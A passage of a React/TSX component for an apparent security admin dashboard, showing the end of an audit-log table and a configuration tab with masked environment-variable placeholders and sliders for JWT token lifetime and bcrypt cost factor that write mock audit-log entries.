                      </span>
                    </td>
                  </tr>
                ))}
                {filteredLogs.length === 0 && (
                  <tr>
                    <td colSpan={7} className="py-8 text-center text-slate-400 italic">No security logs conform to filter parameters.</td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {activeTab === 'configs' && (
        <div className="space-y-6">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            
            {/* Environment Variables & Secrets Masking Section */}
            <div className="bg-white dark:bg-[#1E293B] border border-slate-200 dark:border-slate-800 rounded-2xl p-6 shadow-xs space-y-4">
              <div className="flex justify-between items-center border-b border-slate-150 dark:border-slate-800/85 pb-2.5">
                <div>
                  <h3 className="font-bold text-sm flex items-center gap-1.5">
                    <Key size={16} className="text-blue-500" /> Server-Side Environment Keys
                  </h3>
                  <p className="text-[11px] text-slate-400 mt-0.5">
                    Masked view of high-entropy secrets loaded into Node processes. Excluded strictly from front-end bundle memory.
                  </p>
                </div>
                <span className="text-[10px] text-emerald-500 bg-emerald-500/10 font-bold px-2 py-0.5 rounded-full font-mono">
                  LOCKED
                </span>
              </div>

              <div className="space-y-3 text-[11px] font-mono">
                {/* Var 1 */}
                <div className="flex justify-between items-center p-2.5 border border-slate-100 dark:border-slate-800 rounded-lg">
                  <div>
                    <span className="text-slate-400 block text-[9px] uppercase font-bold">GEMINI API KEY</span>
                    <span className="text-slate-850 dark:text-slate-200 font-bold">GEMINI_API_KEY</span>
                  </div>
                  <span className="text-slate-400">••••••••••••••••••••pL82</span>
                </div>

                {/* Var 2 */}
                <div className="flex justify-between items-center p-2.5 border border-slate-100 dark:border-slate-800 rounded-lg">
                  <div>
                    <span className="text-slate-400 block text-[9px] uppercase font-bold">JWT HMAC SECRET KEY</span>
                    <span className="text-slate-850 dark:text-slate-200 font-bold">JWT_SECRET_KEY</span>
                  </div>
                  <span className="text-slate-400">••••••••••••••••••••9q7X</span>
                </div>

                {/* Var 3 */}
                <div className="flex justify-between items-center p-2.5 border border-slate-100 dark:border-slate-800 rounded-lg">
                  <div>
                    <span className="text-slate-400 block text-[9px] uppercase font-bold">FIREBASE SENSITIVE KEY</span>
                    <span className="text-slate-850 dark:text-slate-200 font-bold">FIREBASE_APP_ID</span>
                  </div>
                  <span className="text-slate-400">••••••••••••••••••••wE91</span>
                </div>

                {/* Var 4 */}
                <div className="flex justify-between items-center p-2.5 border border-slate-100 dark:border-slate-800 rounded-lg">
                  <div>
                    <span className="text-slate-400 block text-[9px] uppercase font-bold">PORT INTEGRATION INGRESS</span>
                    <span className="text-slate-850 dark:text-slate-200 font-bold">PORT</span>
                  </div>
                  <span className="text-slate-850 dark:text-slate-100 font-bold font-mono">3000 (INGRESS SAFE)</span>
                </div>
              </div>
            </div>

            {/* Cryptographic Key Parameters Tuning */}
            <div className="bg-white dark:bg-[#1E293B] border border-slate-200 dark:border-slate-800 rounded-2xl p-6 shadow-xs space-y-6">
              <div className="border-b border-slate-150 dark:border-slate-800/85 pb-2.5">
                <h3 className="font-bold text-sm flex items-center gap-1.5">
                  <Sliders size={16} className="text-purple-500" /> Cryptographic Parameters Tuning
                </h3>
                <p className="text-[11px] text-slate-400 mt-0.5">
                  Customize cryptographic key durations and password hashing calculations stored inside cluster system schemas.
                </p>
              </div>

              {/* JWT Slider */}
              <div className="space-y-2">
                <div className="flex justify-between text-xs">
                  <span className="font-bold text-slate-700 dark:text-slate-300">JWT Token Lifetime Expiry</span>
                  <span className="font-mono text-blue-500 font-bold">{jwtExpiration} Minutes</span>
                </div>
                <input 
                  type="range" 
                  min={5} 
                  max={120} 
                  step={5}
                  value={jwtExpiration} 
                  onChange={(e) => {
                    const val = parseInt(e.target.value);
                    setJwtExpiration(val);
                    // Add audit trail log
                    const newLog: SecurityAuditLog = {
                      id: `LOG-${Math.floor(4000 + Math.random() * 1000)}`,
                      timestamp: new Date().toISOString(),
                      event: `JWT access token expiration threshold configured to ${val} minutes`,
                      actor: 'Security Controller',
                      ipAddress: '127.0.0.1',
                      severity: 'warning',
                      category: 'Key Config'
                    };
                    setLogs(prev => [newLog, ...prev]);
                  }}
                  className="w-full h-1 bg-slate-100 dark:bg-slate-800 rounded-lg appearance-none cursor-pointer accent-blue-600"
                />
                <p className="text-[10px] text-slate-450 leading-relaxed">
                  Lower limits mitigate active token hijacking risks, while higher thresholds reduce redundant token refresh traffic over web socket connections.
                </p>
              </div>

              {/* Bcrypt Cost Factor Slider */}
              <div className="space-y-2">
                <div className="flex justify-between text-xs">
                  <span className="font-bold text-slate-700 dark:text-slate-300">Bcrypt Salt Work Cost Factor</span>
                  <span className="font-mono text-purple-500 font-bold">{bcryptRounds} Rounds (2^{bcryptRounds} iterations)</span>
                </div>
                <input 
                  type="range" 
                  min={8} 
                  max={16} 
                  step={1}
                  value={bcryptRounds} 
                  onChange={(e) => {
                    const val = parseInt(e.target.value);
                    setBcryptRounds(val);
                    // Add audit trail log
                    const newLog: SecurityAuditLog = {
                      id: `LOG-${Math.floor(4000 + Math.random() * 1000)}`,
                      timestamp: new Date().toISOString(),
                      event: `Bcrypt encryption salt cost value set to ${val} rounds`,
                      actor: 'Security Controller',
                      ipAddress: '127.0.0.1',
                      severity: 'info',
                      category: 'Cryptography'
                    };
                    setLogs(prev => [newLog, ...prev]);
                  }}
                  className="w-full h-1 bg-slate-100 dark:bg-slate-800 rounded-lg appearance-none cursor-pointer accent-purple-600"
                />
                <p className="text-[10px] text-slate-450 leading-relaxed">
                  OWASP recommendations specify a minimum value of 10. Higher factors mathematically resist brute-force/rainbow-table credential cracking.
                </p>
              </div>
            </div>

          </div>
        </div>
      )}

    </div>
  );
};
